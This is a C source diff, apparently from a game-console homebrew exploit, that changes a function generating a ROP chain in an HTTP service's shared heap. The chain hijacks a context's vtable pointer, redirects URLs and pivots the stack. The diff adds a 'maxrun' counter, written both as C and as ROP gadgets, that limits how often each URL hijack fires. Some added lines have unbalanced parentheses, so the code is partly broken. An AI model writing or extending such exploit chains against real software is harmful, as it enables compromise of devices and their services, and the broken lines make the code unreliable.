@@ -886,7 +886,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	u32 *ropchain_block0, ropvaddr_block0;
 	u32 *ropchain_block1, ropvaddr_block1;
 
-	u32 ropallocsize = 0x5000;
+	u32 ropallocsize = 0x5200;
 	u32 ropoffset = 0x800;
 	u32 bakropoff = ropoffset + ropallocsize;
 	u32 roplaunch_bakaddr;
@@ -1082,8 +1082,14 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	do {
 		if(strncmp(createcontext_inputurl, curent->url, strlen(curent->url))==0)
 		{
+			if(*((u32*)curent->maxrun_set))
+			{
+				if(*((u32*)curent->maxrun)==0)continue;//jump down to the curent update ROP.
+				*((u32*)curent->maxrun))--;
+			}
 			*((u32*)(ropheap+0x1c)) = curent->vtableptr;
 			if(*((u32*)curent->new_url))*((u32*)(ropheap+0x20)) = curent->new_url;
+			curent->lastmatch_id = 0;
 			break;
 		}
 
@@ -1114,6 +1120,11 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 		/*
 		if(strncmp(createcontext_inputurl, curent->url, strlen(curent->url))==0)
 		{
+			if(*((u32*)curent->maxrun_set))
+			{
+				if(*((u32*)curent->maxrun)==0)continue;
+				*((u32*)curent->maxrun))--;
+			}
 			*((u32*)(ropheap+0x1c)) = curent->vtableptr;
 			if(*((u32*)curent->new_url))*((u32*)(ropheap+0x20)) = curent->new_url;
 			curent->lastmatch_id = 0;
@@ -1125,6 +1136,43 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 		ropchain_block0 = ropchain;
 		ropvaddr_block0 = ropvaddr;
 		ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);//if(*((u32*)curent->maxrun_set))
+		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturlctx, maxrun_set));
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
+
+		ropgen_popr1(&ropchain, &ropvaddr, 0);
+		ropchain6 = ropchain;
+		ropvaddr6 = ropvaddr;
+		ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);//if(*((u32*)curent->maxrun)==0)continue;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturlctx, maxrun));
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
+
+		ropgen_popr1(&ropchain, &ropvaddr, 0);
+		ropchain5 = ropchain;
+		ropvaddr5 = ropvaddr;
+		ropgen_checkcond_necontinue_eqjump(&ropchain, &ropvaddr, 0);
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);//*((u32*)curent->maxrun))--;
+		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturlctx, maxrun));
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, 0, 0);
+		ropgen_add_r0ip(&ropchain, &ropvaddr, 0xffffffff);
+		ropchain4 = ropchain;
+		ropvaddr4 = ropvaddr;
+		ropgen_strr0r1(&ropchain, &ropvaddr, 0, 1);//Overwrite the value for writeu32 below.
+
+		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);
+		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturlctx, maxrun)-4);
+		ropgen_movr1r0(&ropchain, &ropvaddr);
+		ropgen_strr0r1(&ropchain4, &ropvaddr4, ropvaddr+4, 1);
+		ropgen_writeu32(&ropchain, &ropvaddr, 0, 0, 0);
+
+		ropgen_checkcond_necontinue_eqjump(&ropchain6, &ropvaddr6, ropvaddr);
 
 		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);//*((u32*)(ropheap+0x1c)) = curent->vtableptr;
 		ropgen_add_r0ip(&ropchain, &ropvaddr, offsetof(targeturlctx, vtableptr));
@@ -1156,6 +1204,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 		ropvaddr_block1 = ropvaddr;
 		ropgen_stackpivot(&ropchain, &ropvaddr, 0);
 
+		ropgen_checkcond_necontinue_eqjump(&ropchain5, &ropvaddr5, ropvaddr);
 		ropgen_checkcond_eqcontinue_nejump(&ropchain_block0, &ropvaddr_block0, ropvaddr);
 
 		ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x28, 1);//curent = curent->next_vaddr;
